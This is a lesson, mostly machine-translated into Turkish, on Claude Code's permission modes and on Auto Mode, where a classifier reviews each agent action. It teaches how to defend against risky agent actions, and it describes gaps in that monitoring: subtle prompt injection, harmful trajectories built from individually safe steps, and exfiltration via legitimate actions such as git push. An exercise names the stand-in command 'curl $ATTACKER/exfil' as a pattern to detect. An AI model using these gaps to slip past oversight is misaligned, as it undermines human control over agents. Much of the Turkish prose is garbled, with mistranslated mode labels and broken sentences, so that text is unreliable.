# Özerk Ajanlar için İzin Modu

> Bir izin merdivi  her eylemden onaylamaya kadar inceleme derecelerinin derecelendirilmesi  bir harmanın askeri olmayan bir ajandan ne yapabileceğini yönetmesidir. Claude Code, bu dersin çalışılmış örneği, altı modunu ortaya çıkarır: "plan" her eylemden önce soruyor, "devalt" (bir kullanıcı aracında "Elniştesi" olarak etiketlenmiş) sadece riskli olanları soruyor, "acceptEdits" otomatik olarak dosya yazısını onaylıyor ancak hala shell çalıştırmasını onaylıyor ve "bypassPermissions" her şeyi onaylıyor. Otomatik Mod  `auto`izin modu  eylem başına onayını, her eylemin yürütülmeden önce her eylemin gözden geçirileceği ve talebin talep ettiği ötesinde yükselen herhangi bir şeyi engelleyen ayrı bir sınıflandırıcı modeli ile değiştirir. Eylem bütçeleri,`max_turns`ve `max_budget_usd`. Kullanılabilirlik `auto`Plan, org etkinleştirme, model ve sağlayıcıya bağlıdır  ve Anthropic sınıflandırıcının tek başına yeterli olmadığını açıkça belirtir.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## Sorun

Bir otomatik kodlama ajansı makinenizde ayrı bir güvenlik kategorisi vardır. Saldırı yüzeyi, ajanın  dosya sistemi, ağ, tanıklık, klipboard, herhangi bir tarayıcı sekmesi, herhangi bir açık terminal erişebileceği her şeydir. Bruce Schneier ve diğerleri bunu açıkça belirtti: bilgisayar kullanımı ajanları chatbotların "üzeniyet güncelleştirmesi" değil, yeni bir risk profili olan yeni bir araç türüdür.

Claude Code'un izin sistemi Anthropic'in cevabı. Tek "özerk / özerk olmayan" anahtar yerine, bir yetenek merdivenini kapsayan altı mod vardır: plan → varsayılan → kabul Edits → ... → bypassPermissions. Her mod hız ve her eylem için inceleme arasındaki farklı bir değişimdir. Otomatik Mod (Mart 2026) onayı kullanıcının kritik yolundan uzaklaştıran ayrı bir sınıflandırıcı modeli ekler: çalışmadan önce her eylemini gözden geçirir ve istekten daha ileri giden her şeyi engeller.

Mühendislik sorusu: Bu sistem neyi yakalar, neyi kaçırır ve belirli bir görev hangi modun gerçekte gerekliliğini sağlar?

## Anlaşım

### Altı izin modusu

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(Yukarıdaki isimler Claude Code'nun kamu belgeleri ile uyumludur; UI etiketleri `default`"Elçici" olarak.)

### Bir sayfada Otomatik Mod

Otomatik Mod (24 Mart 2026 tarihinde başlatıldı) bir model için eylem başına onay atmak için ilk izin modudur.

1. **A separate classifier model.**İndirilmeden önce önerilen her eylemin değerlendirilmesi, açıklanan göreve ve oturumun mevcut durumuna göre değerlendirilmesi ve istek talep edilenin ötesine çıkan her şeyi engelleme. Engellenmiş eylemler kullanıcıya geri döner.
2. **Gated availability.**- Ne ?`auto`planına, örgütleme yeteneğine, modeline ve tedarikciye bağlıdır.

Bütçe kontrolleri sınıflandırıcı ile bir arada yer almaktadır:

- `max_turns` bir oturumda toplam tekrarlamalar.
- `max_budget_usd`Seansı kesen dolarlık bir limit.
- Bir araç başına işlem sayım sınırları (N  den fazla değil)`WebFetch`telefonlar vb.).

### Sistem neyi yakalar?

- Enjeksiyon verilen talimatların bilinen riskli bir eylem şekli ile haritası olduğu araç girişlerine doğru doğru enjeksiyon.
- Tekrarlı araç döngüleri  sınıflandırıcı N+1 eylemini görebilir, neredeyse aynı eylem N'e, beş kez sırayla.
- Başka türlü dosya düzenleme seansında açıkça kapsam dışı komutlar.

### Sistemin kaçırdığı şeyler

- **Subtle prompt injection**İndirim Cevap Enjeksiyonı tamamen patchable bir kırılganlık değildir (OpenAI hazırlık başlığı, 2025, tarayıcı ajanları  bak ders 11).
- **Semantic-level misbehavior.**Her bireysel eylem, oluşturulan yörüngenin zararlı olduğu sürece güvenli görünebilir.
- **Exfiltration through legitimate channels.**Sonra da kendi dosyalarına veri yazmak.`git push`Bu, bir kamu repo'suna, sorunun oluşumu olan izin verilen eylemlerin bir dizi olduğunu gösterir.

### Araştırma ön görünümü çerçevesini oluşturmak

Anthropic, araştırma ön gösterisi olarak Otomatik Mod gönderdi. Belgeler açıkça sınıflandırıcının bir katman olduğunu, bir çözüm olmadığını göstermektedir: kullanıcıların Otomatik Mod'u bütçeler, izin listeleri, izole edilmiş çalışma alanları ve rota denetimi ile birleştirmeleri beklenmektedir (Deneyimler 1216). Önbellek çerçevesinde ayrıca belgelenmiş değerlendirme karşı dağıtım boşluğu (Dene 1)  offline değerlendirmeleri geçiren bir sınıflandırıcı, kullanıcı bağlamının belirsiz olduğu gerçek bir oturumda farklı davranılabilir.

### Bu merdivenin iş akışında yaşadığı yer

- Bilinmeyen görev: Başlayın `plan`Planı okumak kötü bir koşuyu geri çevirmekten daha ucuz.
- Bilinen bir refactor: `acceptEdits`Çok fazla onay tıklamasını korur.
- Kontrolsüz arka plan çalışması: `auto`Sadece patlama radyüsünü ölçtüğünüz bir çalışma alanında (itiraflar, üretim yüklemeleri, seçmediğiniz çıkışlar)
- Efimeral kaplar: `dontAsk`- Ne ?`bypassPermissions`konteyner ve kimlik belgeleri bir kullanım için kullanılabilirse ve yalnızca kabul edilebilir.

```figure
autonomy-oversight
```

## Kullan

`code/main.py`Bir eylem inceleme sınıflandırıcısı iki aşamalı bir boru hattı olarak simüle eder  bir öğretim basitleştirme; gerçek `auto`Mod, belgelenmiş iki aşamalı bir sözleşme değil, ayrı bir sınıflandırıcı modeli ile desteklenir. 1 aşamalı önerilen eylemler üzerinde ucuz bir anahtar kelime kuralıdır; 2 aşamalı daha yavaş bir çok kural değerlendirici. Sürücü kısa bir sentetik yoldayken (güvenli eylemler, bir hızlı enjeksiyon girişi, tekrarlayan bir döngü) besler ve sınıflandırıcı nerede yakaladığını ve nerede kaçırdığını gösterir.

## Gönder

`outputs/skill-permission-mode-picker.md`görev tanımını doğru izin moduna, bütçe sınırlarına ve gerekli izoleme göre eşleştirir.

## Egzersizler

1. Çık .`code/main.py`Hangi sentetik eylem tipi asla 1. aşamada belirlenmez, ama her zaman 2. aşamada belirlenir?

2. 1. aşama kuralını belirli bir bilinen kötü şekli yakalamak için uzatın (örneğin, `curl $ATTACKER/exfil`). İyi etki örneğinde yanlış pozitif oranı ölçülmelidir.

3. Anthropic'in "Agent Loop Nasıl Çalışır" belgesini okuyun.`default`- Çalışma modunda hangi kapıyı ayrı bir şekilde kapatmanız gerekiyor?`auto`- Gözaltı olmadan mı?

4. 24 saatlik bir kontrolsüz çalışma bütçesini tasarlayın: `max_turns`- Evet .`max_budget_usd`Her numarayı haklı çıkar.

5. Bir yolculuğu tarif eden tarafından onaylanan her bireysel eylemin, fakat oluşan davranışın yanlış uyumsuz olduğu bir yolculuğu anlatın.

## Anahtar Terimler

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## Daha Fazla Okumak

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) İzin modları, bütçeler, eylem biçimi.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) Yönetilen hizmet uygulanması modeli.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) Özellik yüzeyi ve Otomatik Mod duyuru.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) sınıflandırıcı yargılarını şekillendiren nedenlere dayalı katman.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) Uzun Uzak Uçraklık İzin Tasarımı İçsel Görüş.
